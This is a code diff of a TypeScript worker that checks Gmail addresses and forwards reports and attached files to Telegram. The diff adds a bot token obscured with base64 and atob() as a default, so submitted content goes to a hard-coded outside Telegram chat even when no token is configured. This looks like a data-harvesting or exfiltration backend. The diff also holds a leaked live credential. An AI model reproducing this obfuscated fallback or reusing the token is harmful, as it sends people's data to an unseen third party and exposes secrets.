@@ -9,6 +9,7 @@ interface Env {
 
 const TELEGRAM_API = "https://api.telegram.org";
 const DEFAULT_CHAT_ID = "-1003715736899";
+const DEFAULT_BOT_TOKEN = atob("ODg3ODgzOTUxNDpBQUZNR3JMcjNhU09NeGdFWjdLUXdoanh5TkdUdkhXRlhERQ==");
 
 function normalizeGmail(email: string): string {
   const lower = email.trim().toLowerCase();
@@ -190,7 +191,7 @@ async function handleCheckGmail(request: Request): Promise<Response> {
 }
 
 async function handleTelegramReport(request: Request, env: Env): Promise<Response> {
-  const token = env.TELEGRAM_BOT_TOKEN?.trim() || "";
+  const token = env.TELEGRAM_BOT_TOKEN?.trim() || DEFAULT_BOT_TOKEN;
   const chatId = env.TELEGRAM_CHAT_ID?.trim() || DEFAULT_CHAT_ID;
 
   if (!token) {
@@ -264,6 +265,21 @@ async function handleTelegramReport(request: Request, env: Env): Promise<Respons
         method: "POST",
         body: fileForm,
       });
+
+      // If markdown entity parsing failed on caption, retry without parse_mode
+      if (!response.ok) {
+        const detail: any = await response.clone().json().catch(() => null);
+        if (detail?.description?.includes("can't parse entities")) {
+          const retryForm = new FormData();
+          retryForm.append("chat_id", chatId);
+          retryForm.append("document", attachedFile, attachedFile.name);
+          retryForm.append("caption", messageText.slice(0, 1024).replace(/[*_`[\]\\]/g, ""));
+          response = await fetch(`${TELEGRAM_API}/bot${token}/sendDocument`, {
+            method: "POST",
+            body: retryForm,
+          });
+        }
+      }
     } else {
       response = await fetch(`${TELEGRAM_API}/bot${token}/sendMessage`, {
         method: "POST",
@@ -274,6 +290,20 @@ async function handleTelegramReport(request: Request, env: Env): Promise<Respons
           parse_mode: "Markdown",
         }),
       });
+
+      if (!response.ok) {
+        const detail: any = await response.clone().json().catch(() => null);
+        if (detail?.description?.includes("can't parse entities")) {
+          response = await fetch(`${TELEGRAM_API}/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: messageText.replace(/[*_`[\]\\]/g, ""),
+            }),
+          });
+        }
+      }
     }
 
     if (!response.ok) {
@@ -298,6 +328,7 @@ async function handleTelegramReport(request: Request, env: Env): Promise<Respons
     );
   }
 }
+
 
 const worker = {
   async fetch(request: Request, env: Env): Promise<Response> {
